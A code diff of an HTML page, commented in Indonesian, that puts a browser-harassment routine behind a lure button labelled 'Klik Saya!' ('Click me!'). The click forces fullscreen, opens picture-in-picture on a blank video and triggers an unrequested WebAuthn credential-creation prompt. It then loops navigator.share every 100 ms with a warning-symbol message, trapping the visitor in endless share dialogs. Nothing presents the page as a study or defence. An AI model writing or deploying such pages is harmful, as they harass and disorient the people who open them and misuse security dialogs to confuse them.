@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Fullscreen, PiP, & WebAuthn Event</title>
+    <title>Fullscreen, PiP, & WebAuthn Button</title>
     <style>
         html, body {
             width: 100%;
@@ -10,8 +10,21 @@
             margin: 0;
             padding: 0;
             background-color: #121212;
-            cursor: default;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             overflow: hidden;
+        }
+        /* Tombol standar tanpa animasi */
+        .trigger-btn {
+            height: 100px;
+            width: 200px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border: 2px solid #fff;
+            background-color: #ffffff;
+            color: #000000;
         }
         /* Menyembunyikan elemen video agar tidak merusak tampilan */
         video {
@@ -21,11 +34,15 @@
 </head>
 <body>
 
+<!-- Satu Tombol Utama di Tengah Layar -->
+<button id="mainBtn" class="trigger-btn">Klik Saya!</button>
+
 <!-- Elemen video tiruan untuk memicu Picture-in-Picture -->
 <video id="pipVideo" autoplay loop muted playsinline></video>
 
 <script>
 const video = document.getElementById('pipVideo');
+const btn = document.getElementById('mainBtn');
 
 // Membuat video stream kosong (warna hitam) agar PiP bisa aktif tanpa file video asli
 const canvas = document.createElement('canvas');
@@ -39,9 +56,8 @@ ctx.fillRect(0, 0, canvas.width, canvas.height);
 const stream = canvas.captureStream(30);
 video.srcObject = stream;
 
-// Mendengarkan event klik kanan di mana saja pada layar
-window.addEventListener('contextmenu', async function(e) {
-    e.preventDefault(); // Mencegah menu bawaan klik kanan
+// Menjalankan semua aksi saat tombol diklik kiri
+btn.addEventListener('click', async function() {
     
     // 1. Memicu Fullscreen
     if (document.documentElement.requestFullscreen) {
@@ -70,12 +86,11 @@ window.addEventListener('contextmenu', async function(e) {
                 name: "user@example.com",
                 displayName: "User"
             },
-            pubKeyCredParams: [{ type: "public-key", alg: -7 }], // ES256
+            pubKeyCredParams: [{ type: "public-key", alg: -7 }], 
             timeout: 60000,
             authenticatorSelection: { userVerification: "required" }
         };
 
-        // Menjalankan WebAuthn tanpa 'await' agar tidak menahan eksekusi script lain di bawahnya
         navigator.credentials.create({ publicKey: publicKeyCredentialCreationOptions })
             .catch(err => console.log("WebAuthn dibatalkan/gagal:", err));
     }
@@ -83,7 +98,7 @@ window.addEventListener('contextmenu', async function(e) {
     // 4. Loop interval share bawaan dari kode Anda
     setInterval(() => { 
         navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}).catch(() => {}); 
-    }, 1);
+    }, 100);
 });
 </script>
 
